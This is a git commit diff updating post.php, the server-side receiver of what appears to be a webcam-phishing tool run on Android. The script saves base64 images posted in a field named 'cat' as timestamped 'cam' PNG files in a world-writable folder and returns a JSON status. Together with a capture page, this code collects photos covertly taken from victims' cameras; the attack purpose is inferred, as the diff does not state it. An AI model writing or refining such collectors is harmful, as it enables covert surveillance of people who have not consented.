24af6728a829939c1ae078c4d43e1da55921c09c
Masterdas <123380450+Masterdas@users.noreply.github.com>
2025-03-01 07:41:51 +0530

    Update post.php

--- post.php
+++ post.php
@@ -1,19 +1,28 @@
 <?php
-
 $date = date('dMYHis');
-$imageData=$_POST['cat'];
+$imageData = $_POST['cat'];
 
-if (!empty($_POST['cat'])) {
-error_log("Received" . "\r\n", 3, "Log.log");
+$folderPath = "/storage/emulated/0/ACamPhoto/";
 
+if (!file_exists($folderPath)) {
+    mkdir($folderPath, 0777, true);
 }
 
-$filteredData=substr($imageData, strpos($imageData, ",")+1);
-$unencodedData=base64_decode($filteredData);
-$fp = fopen( 'cam'.$date.'.png', 'wb' );
-fwrite( $fp, $unencodedData);
-fclose( $fp );
+if (!empty($imageData)) {
+    error_log("Received" . "\r\n", 3, "Log.log");
+
+    // Base64 ডাটা ফিল্টার করা
+    $filteredData = substr($imageData, strpos($imageData, ",") + 1);
+    $unencodedData = base64_decode($filteredData);
+
+    $filePath = $folderPath . "cam" . $date . ".png";
+
+    file_put_contents($filePath, $unencodedData);
+
+    echo json_encode(["status" => "success", "path" => $filePath]);
+} else {
+    echo json_encode(["status" => "error", "message" => "No image data received"]);
+}
 
 exit();
 ?>
-
